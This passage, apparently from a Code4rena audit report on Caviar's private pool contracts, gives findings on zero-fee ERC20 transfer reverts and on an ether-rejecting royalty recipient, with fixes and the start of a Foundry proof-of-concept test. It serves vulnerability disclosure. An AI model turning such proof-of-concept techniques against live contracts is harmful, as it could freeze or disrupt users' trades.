class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">flashFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if base token is ETH then check that caller sent enough for the fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidEthAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer the NFT to the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// call the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">.</span><span class=\"mtk11\">onFlashLoan</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) == </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that flashloan was successful</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlashLoanFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer the NFT from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// transfer the fee from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Note the code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>If the fee is 0 and baseToken revert in 0 value transfer, the user cannot use flashloan.</p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol check if the feeAmount is 0 before performing transfer.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">feeAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/278#issuecomment-1520730822\">outdoteth (Caviar) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/278#issuecomment-1527433776\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown an edge case, when fee are 0 the call to <code>safeTransfer</code> is still performed, this can cause certain ERC20s to revert.</p>\n<p>Because the PrivatePools are meant to work with ERC20s, and this revert is conditional on the specific token implementation, I agree with Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-the-royaltyrecipient-could-not-be-prepare-to-receive-ether-making-the-sell-to-fail\" style=\"position:relative;\"><a href=\"#m-14-the-royaltyrecipient-could-not-be-prepare-to-receive-ether-making-the-sell-to-fail\" aria-label=\"m 14 the royaltyrecipient could not be prepare to receive ether making the sell to fail permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/263\">[M-14] The <code>royaltyRecipient</code> could not be prepare to receive ether, making the <code>sell</code> to fail</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/263\">0x4non</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/982\">saian</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/972\">Kenshin</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/713\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/470\">shaka</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/269\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/206\">SovaSlava</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/54\">Bauer</a></em></p>\n<p>The <code>royaltyRecipient</code> is an arbitrary address setup by the collection if the collection <code>royaltyRecipient</code> is a contract and this contract its not prepared to receive ether the ether transfer will always fail paying the royalties.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here is a foundry POC, take note that I have to write a new Milady mock collection because in the original is hardcoded to <code>0xbeefbeef</code> so its impossible to change the <code>royaltyRecipient</code>;  <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/test/shared/Milady.sol#L31\">Milady.sol#L31</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;test/Fixture.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">POCRejectTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Fixture</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalTokens</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOutputAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFeeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0.1e18</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 10%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">EthRejecter</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Milady2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">milady2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Milady2</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethRouter</span><span class=\"mtk1\">), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mockCall</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ownerOf</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// lets setup a trap for the royalty        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRoyaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFeeRate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_addSell</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (EthRouter.Sell </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">empty</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">create</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">100e18</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">100e18</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">10e18</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">200</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">199</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">true</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// random between each call to _addBuy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">empty</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">100e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">2</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">milady2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalTokens</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">totalTokens</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalTokens</span><span class=\"mtk1\"> += </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicPoolProofs</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[][](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Sell</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sell</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Sell</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">pool:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nft:</span><span class=\"mtk1\"> </span><span 